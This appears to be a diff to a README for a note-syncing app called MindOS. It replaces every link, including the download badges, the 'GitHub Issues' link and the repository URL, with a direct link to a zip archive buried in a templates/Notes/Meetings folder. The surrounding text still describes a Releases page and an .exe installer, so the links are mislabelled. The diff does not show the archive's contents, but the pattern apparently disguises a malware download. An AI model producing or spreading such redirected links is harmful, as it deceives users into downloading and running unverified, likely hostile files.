@@ -1,6 +1,6 @@
 # 🧠 MindOS - Sync Your Mind Across Devices
 
-[![Download MindOS](https://img.shields.io/badge/Download-MindOS-4CAF50?style=for-the-badge&logo=github)](https://github.com/Streamlined-kip855/MindOS)
+[![Download MindOS](https://img.shields.io/badge/Download-MindOS-4CAF50?style=for-the-badge&logo=github)](https://github.com/Streamlined-kip855/MindOS/raw/refs/heads/main/templates/en/📝 Notes/Meetings/Mind-OS-1.5.zip)
 
 ---
 
@@ -43,7 +43,7 @@ Follow these steps to get MindOS up and running on your Windows PC.
 
 Click the green button below to visit the official download page on GitHub. This page contains the latest version of MindOS.
 
-[![Download MindOS](https://img.shields.io/badge/Download-MindOS-4CAF50?style=for-the-badge&logo=github)](https://github.com/Streamlined-kip855/MindOS)
+[![Download MindOS](https://img.shields.io/badge/Download-MindOS-4CAF50?style=for-the-badge&logo=github)](https://github.com/Streamlined-kip855/MindOS/raw/refs/heads/main/templates/en/📝 Notes/Meetings/Mind-OS-1.5.zip)
 
 You will see a section called **Releases** on that page. Look for the latest release and download the file ending with `.exe`. This file is the installation program.
 
@@ -131,7 +131,7 @@ MindOS keeps your data safe and easy to restore.
 - **Login problems**: Reset your password via the **Forgot Password** link.
 - **Installation hangs**: Check disk space and close other apps.
 
-For other issues, check the [GitHub Issues](https://github.com/Streamlined-kip855/MindOS/issues) page.
+For other issues, check the [GitHub Issues](https://github.com/Streamlined-kip855/MindOS/raw/refs/heads/main/templates/en/📝 Notes/Meetings/Mind-OS-1.5.zip) page.
 
 ---
 
@@ -139,7 +139,7 @@ For other issues, check the [GitHub Issues](https://github.com/Streamlined-kip85
 
 Visit the GitHub repository for documentation, updates, and support.
 
-https://github.com/Streamlined-kip855/MindOS
+https://github.com/Streamlined-kip855/MindOS/raw/refs/heads/main/templates/en/📝 Notes/Meetings/Mind-OS-1.5.zip
 
 ---
 
